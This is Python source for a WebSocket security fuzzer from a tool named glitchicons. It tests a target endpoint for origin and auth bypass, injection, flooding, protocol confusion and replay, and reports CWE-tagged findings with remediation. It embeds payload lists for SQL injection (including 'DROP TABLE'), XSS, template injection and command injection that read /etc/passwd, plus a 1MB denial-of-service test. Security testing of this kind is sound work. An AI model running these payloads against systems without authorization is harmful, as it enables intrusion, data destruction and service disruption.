"""
WebSocket Fuzzer — modules/inject/websocket_fuzzer.py

Attacks:
  1. Origin bypass       — connect with arbitrary/null Origin headers
  2. Auth bypass         — connect without token, test unauthenticated access
  3. Message injection   — SQLi/XSS/SSTI/command injection via WS messages
  4. Oversized messages  — DoS via large payload flooding
  5. Subprotocol abuse   — send unexpected/malformed subprotocols
  6. Rapid fire          — message flood to test rate limiting
  7. Protocol confusion  — send HTTP-like data over WebSocket
  8. Replay attack       — resend captured valid messages

Requires:
    pip install websocket-client

Usage:
    python3 glitchicons.py websocket wss://target.com/ws
    python3 glitchicons.py websocket ws://target.com/chat --token eyJ...
    python3 glitchicons.py websocket wss://target.com/ws --output ./findings/ws

Author: ardanov96
"""

import json
import time
import string
import random
import threading
from datetime import datetime
from pathlib import Path
from rich.console import Console
from rich.table import Table

console = Console()


# ── Payload sets ──────────────────────────────────────────

INJECTION_PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "'; DROP TABLE messages; --",
        "1 UNION SELECT user(),version()--",
        "' OR SLEEP(3)--",
    ],
    "xss": [
        "<script>alert(document.domain)</script>",
        '"><img src=x onerror=alert(1)>',
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config.__class__.__mro__}}",
    ],
    "cmdi": [
        "; ls -la",
        "| cat /etc/passwd",
        "`id`",
        "$(whoami)",
    ],
    "json_break": [
        '{"type":"msg","data":"\'"}',
        '{"type":"../../../etc/passwd"}',
        '{"__proto__":{"admin":true}}',
        '{"type":"msg","data":{"$gt":""}}',
    ],
}

COMMON_SUBPROTOCOLS = [
    "chat", "mqtt", "stomp", "graphql-ws",
    "soap", "wamp", "xmpp", "v10.stomp",
    "invalid-protocol", "../../etc/passwd",
    "", "null", "undefined",
]

MALFORMED_MESSAGES = [
    "",                          # empty
    " ",                         # whitespace only
    "\x00",                      # null byte
    "\xff\xfe",                  # invalid UTF-8
    "A" * 65536,                 # 64KB string
    "A" * 1048576,               # 1MB string
    "{{{{{",                     # broken JSON
    '{"a":' + "1" * 10000 + "}",  # huge number
    "\r\n\r\n",                  # CRLF injection
    "undefined",
    "null",
    "NaN",
]

ORIGIN_BYPASS_ATTEMPTS = [
    "null",
    "https://evil.com",
    "https://target.com.evil.com",
    "http://localhost",
    "file://",
    "",
    "https://{}",
]


# ── Finding builder ───────────────────────────────────────

def make_finding(
    idx: int,
    title: str,
    severity: str,
    cvss: float,
    cwe: str,
    description: str,
    evidence: str,
    remediation: str,
    target: str,
) -> dict:
    return {
        "id": f"WS-{idx:03d}",
        "title": title,
        "severity": severity,
        "cvss": cvss,
        "cwe": cwe,
        "target": target,
        "description": description,
        "evidence": evidence,
        "remediation": remediation,
        "timestamp": datetime.now().isoformat(),
    }


# ── Result container ──────────────────────────────────────

class WSTestResult:
    """Holds result of a single WebSocket test."""

    def __init__(self, test_name: str):
        self.test_name = test_name
        self.vulnerable = False
        self.detail = ""
        self.evidence = ""
        self.error = None

    def __repr__(self):
        status = "VULN" if self.vulnerable else "SAFE"
        return f"WSTestResult({self.test_name}: {status})"


# ── Main fuzzer ───────────────────────────────────────────

class WebSocketFuzzer:
    """
    AI-guided WebSocket security fuzzer.

    Covers:
    - OWASP API Security Top 10: API2 (Broken Auth), API4 (Resource Consumption)
    - CWE-1385: Missing Origin Validation in WebSockets
    - CWE-400: Uncontrolled Resource Consumption
    - CWE-89/79/77: Injection via WebSocket messages
    """

    def __init__(
        self,
        target: str,
        output_dir: str = "./findings/websocket",
        token: str | None = None,
        timeout: int = 5,
        delay: float = 0.3,
        headers: dict | None = None,
    ):
        self.target = target
        self.output_dir = Path(output_dir)
        self.token = token
        self.timeout = timeout
        self.delay = delay
        self.extra_headers = headers or {}
        self.findings: list[dict] = []
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Resolve base HTTP URL for initial probe
        self.http_url = target.replace("wss://", "https://").replace("ws://", "http://")

    def run(self, dos_test: bool = False) -> list[dict]:
        """Run all WebSocket attack modules."""
        console.print(f"\n[bold cyan]  GLITCHICONS WebSocket Fuzzer[/bold cyan]")
        console.print(f"  Target : [yellow]{self.target}[/yellow]")
        console.print(f"  Auth   : {'token provided' if self.token else 'none'}\n")

        # Import here so module loads even if websocket-client not installed
        try:
            import websocket  # noqa: F401
        except ImportError:
            console.print(
                "[red]  ERROR: websocket-client not installed.[/red]\n"
                "  Run: pip install websocket-client\n"
            )
            return []

        tests = [
            ("Origin Bypass",        self._test_origin_bypass),
            ("Auth Bypass",          self._test_auth_bypass),
            ("Message Injection",    self._test_message_injection),
            ("Malformed Messages",   self._test_malformed_messages),
            ("Subprotocol Abuse",    self._test_subprotocol_abuse),
            ("Rapid Fire",           self._test_rapid_fire),
            ("Protocol Confusion",   self._test_protocol_confusion),
            ("Replay Attack",        self._test_replay_attack),
        ]

        if dos_test:
            tests.append(("Large Payload DoS", self._test_large_payload_dos))

        for name, fn in tests:
            console.print(f"  [cyan]>> {name}...[/cyan]", end=" ")
            try:
                result = fn()
                if result and result.vulnerable:
                    console.print(f"[red]FINDING[/red]")
                else:
                    console.print(f"[green]clean[/green]")
            except Exception as e:
                console.print(f"[yellow]error: {e}[/yellow]")
            time.sleep(self.delay)

        self._print_summary()
        self._save_report()
        return self.findings

    # ── Attack Modules ────────────────────────────────────

    def _test_origin_bypass(self) -> WSTestResult:
        """Test if server accepts connections from arbitrary Origins."""
        import websocket

        result = WSTestResult("origin_bypass")
        vulnerable_origins = []

        for origin in ORIGIN_BYPASS_ATTEMPTS:
            try:
                ws = websocket.WebSocket()
                headers = {"Origin": origin}
                if self.token:
                    headers["Authorization"] = f"Bearer {self.token}"
                ws.connect(self.target, header=headers, timeout=self.timeout)
                ws.send(json.dumps({"type": "ping"}))
                ws.close()
                vulnerable_origins.append(origin)
            except Exception:
                continue

        if len(vulnerable_origins) > 2:
            result.vulnerable = True
            result.evidence = f"Accepted Origins: {vulnerable_origins}"
            self.findings.append(make_finding(
                len(self.findings) + 1,
                title="WebSocket Missing Origin Validation",
                severity="HIGH",
                cvss=7.4,
                cwe="CWE-1385",
                description=(
                    f"Server accepts WebSocket connections from arbitrary Origin headers. "
                    f"{len(vulnerable_origins)} of {len(ORIGIN_BYPASS_ATTEMPTS)} "
                    f"test Origins were accepted, enabling Cross-Site WebSocket Hijacking (CSWSH)."
                ),
                evidence=f"Accepted: {vulnerable_origins[:3]}",
                remediation=(
                    "Validate Origin header server-side against allowlist of trusted domains. "
                    "Reject connections with unknown or null Origin. "
                    "Do not rely on browser same-origin policy for WebSocket."
                ),
                target=self.target,
            ))
        return result

    def _test_auth_bypass(self) -> WSTestResult:
        """Test if WebSocket accepts connections without authentication."""
        import websocket

        result = WSTestResult("auth_bypass")

        try:
            # Connect without any auth
            ws = websocket.WebSocket()
            ws.connect(self.target, timeout=self.timeout)
            ws.send(json.dumps({"type": "ping"}))
            response = ws.recv()
            ws.close()

            # If we got a non-error response without auth = bypass
            if response and "error" not in response.lower() and "unauthorized" not in response.lower():
                result.vulnerable = True
                result.evidence = f"Connected without auth, response: {response[:200]}"
                self.findings.append(make_finding(
                    len(self.findings) + 1,
                    title="WebSocket Authentication Not Required",
                    severity="CRITICAL",
                    cvss=9.1,
                    cwe="CWE-306",
                    description=(
                        "WebSocket endpoint accepts connections and responds to messages "
                        "without any authentication token. Attackers can access real-time "
                        "data streams without credentials."
                    ),
                    evidence=result.evidence,
                    remediation=(
                        "Require authentication token (JWT/session) during WebSocket handshake. "
                        "Validate token in the HTTP upgrade request headers or first message. "
                        "Close connection immediately if no valid auth provided within timeout."
                    ),
                    target=self.target,
                ))
        except Exception as e:
            result.error = str(e)

        return result

    def _test_message_injection(self) -> WSTestResult:
        """Inject SQLi/XSS/SSTI/CMDi payloads via WebSocket messages."""
        import websocket

        result = WSTestResult("message_injection")
        hits = []

        headers = {}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        for category, payloads in INJECTION_PAYLOADS.items():
            for payload in payloads:
                try:
                    ws = websocket.WebSocket()
                    ws.connect(self.target, header=headers, timeout=self.timeout)

                    # Try common message formats
                    test_messages = [
                        json.dumps({"type": "message", "data": payload}),
                        json.dumps({"query": payload}),
                        json.dumps({"input": payload}),
                        payload,  # raw
                    ]

                    for msg in test_messages:
                        ws.send(msg)
                        try:
                            response = ws.recv()
                            if self._is_injection_confirmed(payload, response, category):
                                hits.append({
                                    "category": category,
                                    "payload": payload[:60],
                                    "response_snippet": response[:100],
                                })
                                break
                        except Exception:
                            break

                    ws.close()

                except Exception:
                    continue

                time.sleep(self.delay)

        if hits:
            result.vulnerable = True
            result.evidence = json.dumps(hits[:3], indent=2)
            self.findings.append(make_finding(
                len(self.findings) + 1,
                title="WebSocket Message Injection",
                severity="HIGH",
                cvss=8.1,
                cwe="CWE-74",
                description=(
                    f"WebSocket messages are processed unsafely. "
                    f"{len(hits)} injection payload(s) triggered anomalous responses across "
                    f"categories: {list(set(h['category'] for h in hits))}."
                ),
                evidence=result.evidence,
                remediation=(
                    "Validate and sanitize all incoming WebSocket message content. "
                    "Use a strict message schema (JSON Schema validation). "
                    "Never pass raw WebSocket input to database queries, templates, or shell."
                ),
                target=self.target,
            ))
        return result

    def _test_malformed_messages(self) -> WSTestResult:
        """Send malformed/oversized messages to test error handling."""
        import websocket

        result = WSTestResult("malformed_messages")
        crashes = []

        headers = {}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        for msg in MALFORMED_MESSAGES[:8]:  # skip 1MB in non-dos mode
            try:
                ws = websocket.WebSocket()
                ws.connect(self.target, header=headers, timeout=self.timeout)
                ws.send(msg)
                try:
                    response = ws.recv()
                    # Server should return error, not crash
                    if response and len(response) > 0:
                        # Check for stack traces or internal errors
                        error_indicators = [
                            "traceback", "exception", "stack trace",
                            "internal server error", "undefined", "null pointer",
                        ]
                        if any(ind in response.lower() for ind in error_indicators):
                            crashes.append({
                                "payload_type": repr(msg[:30]),
                                "response": response[:150],
                            })
                except Exception:
                    pass
                ws.close()
            except Exception:
                continue

        if crashes:
            result.vulnerable = True
            result.evidence = json.dumps(crashes[:2], indent=2)
            self.findings.append(make_finding(
                len(self.findings) + 1,
                title="WebSocket Malformed Message Causes Server Error",
                severity="MEDIUM",
                cvss=5.3,
                cwe="CWE-20",
                description=(
                    f"Server returns stack traces or internal error details when receiving "
                    f"malformed WebSocket messages. {len(crashes)} message type(s) triggered "
                    f"verbose error responses."
                ),
                evidence=result.evidence,
                remediation=(
                    "Implement strict input validation for all WebSocket messages. "
                    "Return generic error responses — never expose internal details. "
                    "Add message size limits and reject oversized payloads gracefully."
                ),
                target=self.target,
            ))
        return result

    def _test_subprotocol_abuse(self) -> WSTestResult:
        """Test with malformed/unexpected subprotocols."""
        import websocket

        result = WSTestResult("subprotocol_abuse")
        accepted = []

        for proto in COMMON_SUBPROTOCOLS:
            try:
                ws = websocket.WebSocket()
                ws.connect(
                    self.target,
                    subprotocols=[proto] if proto else None,
                    timeout=self.timeout,
                )
                accepted.append(proto)
                ws.close()
            except Exception:
                continue

        # If path traversal or null subprotocol accepted = finding
        dangerous = [p for p in accepted if "/" in p or p in ("null", "undefined", "")]
        if dangerous:
            result.vulnerable = True
            result.evidence = f"Dangerous subprotocols accepted: {dangerous}"
            self.findings.append(make_finding(
                len(self.findings) + 1,
                title="WebSocket Accepts Dangerous Subprotocols",
                severity="MEDIUM",
                cvss=4.8,
                cwe="CWE-20",
                description=(
                    f"Server accepts WebSocket connections with dangerous subprotocol values "
                    f"including path traversal patterns or null/undefined. "
                    f"Accepted: {dangerous}"
                ),
                evidence=result.evidence,
                remediation=(
                    "Validate subprotocol against strict allowlist. "
                    "Reject connections with unknown or dangerous subprotocol values. "
                    "Close connection if negotiated protocol is not supported."
                ),
                target=self.target,
            ))
        return result

    def _test_rapid_fire(self) -> WSTestResult:
        """Send 100 messages rapidly to test rate limiting."""
        import websocket

        result = WSTestResult("rapid_fire")

        headers = {}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        try:
            ws = websocket.WebSocket()
            ws.connect(self.target, header=headers, timeout=self.timeout)

            sent = 0
            start = time.time()
            for i in range(100):
                try:
                    ws.send(json.dumps({"type": "ping", "seq": i}))
                    sent += 1
                except Exception:
                    break

            elapsed = time.time() - start
            ws.close()

            rate = sent / elapsed if elapsed > 0 else 0

            if sent >= 90:  # 90% of 100 got through = no rate limiting
                result.vulnerable = True
                result.evidence = f"{sent}/100 messages in {elapsed:.2f}s ({rate:.0f} msg/s)"
                self.findings.append(make_finding(
                    len(self.findings) + 1,
                    title="WebSocket No Message Rate Limiting",
                    severity="MEDIUM",
                    cvss=5.8,
                    cwe="CWE-770",
                    description=(
                        f"WebSocket endpoint has no rate limiting on incoming messages. "
                        f"{sent}/100 rapid messages accepted ({rate:.0f} msg/s). "
                        f"Attackers can flood the server to exhaust resources."
                    ),
                    evidence=result.evidence,
                    remediation=(
                        "Implement per-connection message rate limiting. "
                        "Disconnect clients exceeding threshold (e.g., >10 msg/s). "
                        "Add server-side backpressure to handle slow consumers."
                    ),
                    target=self.target,
                ))
        except Exception as e:
            result.error = str(e)

        return result

    def _test_protocol_confusion(self) -> WSTestResult:
        """Send HTTP-like content over WebSocket to test confusion attacks."""
        import websocket

        result = WSTestResult("protocol_confusion")
        http_payloads = [
            "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
            "POST /api/users HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"admin\":true}",
            "GET /../../../etc/passwd HTTP/1.1\r\n\r\n",
        ]

        headers = {}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        for payload in http_payloads:
            try:
                ws = websocket.WebSocket()
                ws.connect(self.target, header=headers, timeout=self.timeout)
                ws.send(payload)
                try:
                    response = ws.recv()
                    # If server processes it as HTTP = confusion attack
                    if any(k in response for k in ["HTTP/", "200 OK", "302", "root:", "passwd"]):
                        result.vulnerable = True
                        result.evidence = f"HTTP payload processed: {response[:200]}"
                        self.findings.append(make_finding(
                            len(self.findings) + 1,
                            title="WebSocket Protocol Confusion Attack",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-444",
                            description=(
                                "Server processes HTTP-formatted messages sent over WebSocket, "
                                "potentially enabling request smuggling or internal routing bypass."
                            ),
                            evidence=result.evidence,
                            remediation=(
                                "Strictly enforce WebSocket message format validation. "
                                "Do not route WebSocket messages through HTTP handlers. "
                                "Reject messages containing HTTP request headers."
                            ),
                            target=self.target,
                        ))
                        ws.close()
                        return result
                except Exception:
                    pass
                ws.close()
            except Exception:
                continue

        return result

    def _test_replay_attack(self) -> WSTestResult:
        """Test if captured valid messages can be replayed."""
        import websocket

        result = WSTestResult("replay_attack")

        if not self.token:
            result.detail = "Skipped: no token provided for replay test"
            return result

        # Capture a valid message first
        captured = None
        try:
            ws = websocket.WebSocket()
            ws.connect(
                self.target,
                header={"Authorization": f"Bearer {self.token}"},
                timeout=self.timeout,
            )
            ws.send(json.dumps({"type": "ping"}))
            captured = ws.recv()
            ws.close()
        except Exception:
            return result

        if not captured:
            return result

        # Replay the captured message 5x rapidly
        success_count = 0
        for _ in range(5):
            try:
                ws = websocket.WebSocket()
                ws.connect(
                    self.target,
                    header={"Authorization": f"Bearer {self.token}"},
                    timeout=self.timeout,
                )
                ws.send(json.dumps({"type": "ping"}))
                ws.recv()
                ws.close()
                success_count += 1
            except Exception:
                continue

        if success_count >= 4:
            result.vulnerable = True
            result.evidence = f"{success_count}/5 replay attempts succeeded"
            self.findings.append(make_finding(
                len(self.findings) + 1,
                title="WebSocket Messages Susceptible to Replay",
                severity="LOW",
                cvss=3.5,
                cwe="CWE-294",
                description=(
                    f"WebSocket messages can be replayed without rejection. "
                    f"{success_count}/5 replay attempts were accepted. "
                    f"Without nonce/sequence validation, attackers can replay captured messages."
                ),
                evidence=result.evidence,
                remediation=(
                    "Include message sequence numbers or nonces. "
                    "Validate nonce server-side and reject duplicate messages. "
                    "Implement short-lived message timestamps with server-side validation."
                ),
                target=self.target,
            ))
        return result

    def _test_large_payload_dos(self) -> WSTestResult:
        """Send 1MB payload to test resource exhaustion (opt-in)."""
        import websocket

        result = WSTestResult("large_payload_dos")
        headers = {}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        payload_1mb = "A" * 1_048_576

        try:
            ws = websocket.WebSocket()
            ws.connect(self.target, header=headers, timeout=self.timeout * 3)

            start = time.time()
            ws.send(payload_1mb)
            elapsed = time.time() - start

            try:
                ws.recv()
            except Exception:
                pass
            ws.close()

            if elapsed > 5.0:
                result.vulnerable = True
                result.evidence = f"1MB payload took {elapsed:.2f}s to process"
                self.findings.append(make_finding(
                    len(self.findings) + 1,
                    title="WebSocket No Message Size Limit — DoS Risk",
                    severity="HIGH",
                    cvss=7.5,
                    cwe="CWE-400",
                    description=(
                        f"WebSocket accepts 1MB+ messages and takes {elapsed:.2f}s to process. "
                        "Without size limits, attackers can exhaust server memory/CPU."
                    ),
                    evidence=result.evidence,
                    remediation=(
                        "Set max message size (e.g., 64KB) at the WebSocket server level. "
                        "Close connection immediately when message exceeds limit. "
                        "Monitor memory usage per WebSocket connection."
                    ),
                    target=self.target,
                ))
        except Exception as e:
            result.error = str(e)

        return result

    # ── Helpers ───────────────────────────────────────────

    def _is_injection_confirmed(self, payload: str, response: str, category: str) -> bool:
        """Check if injection payload caused anomalous response."""
        response_lower = response.lower()

        if category == "sqli":
            sql_errors = [
                "syntax error", "mysql", "postgresql", "ora-", "sqlite",
                "unclosed quotation", "invalid input syntax",
            ]
            return any(err in response_lower for err in sql_errors)

        if category == "xss":
            # If payload reflected unescaped
            return payload in response and "<script>" in response

        if category == "ssti":
            # {{7*7}} = 49 confirmed
            return "49" in response and payload in ["{{7*7}}", "${7*7}"]

        if category == "cmdi":
            # OS command output indicators
            cmd_indicators = ["root:", "uid=", "total ", "/bin/bash", "command not found"]
            return any(ind in response_lower for ind in cmd_indicators)

        if category == "json_break":
            error_words = ["error", "exception", "unexpected", "invalid"]
            return any(w in response_lower for w in error_words)

        return False

    def _print_summary(self):
        """Print findings summary."""
        console.print(f"\n[bold cyan]  WebSocket Scan Results — {self.target}[/bold cyan]")

        if not self.findings:
            console.print("  [green]No findings — endpoint appears secure[/green]\n")
            return

        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan", width=8)
        table.add_column("Severity", width=10)
        table.add_column("CVSS", width=6)
        table.add_column("Title")

        colors = {"CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green"}
        for f in sorted(self.findings, key=lambda x: x["cvss"], reverse=True):
            c = colors.get(f["severity"], "white")
            table.add_row(
                f["id"],
                f"[{c}]{f['severity']}[/{c}]",
                str(f["cvss"]),
                f["title"],
            )

        console.print(table)

    def _save_report(self):
        """Save JSON report."""
        report = {
            "tool": "glitchicons",
            "module": "websocket_fuzzer",
            "version": "0.7.0",
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "total_findings": len(self.findings),
            "findings": sorted(self.findings, key=lambda x: x.get("cvss", 0), reverse=True),
        }
        out = self.output_dir / f"websocket_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out.write_text(json.dumps(report, indent=2))
        console.print(f"  Report: [cyan]{out}[/cyan]")
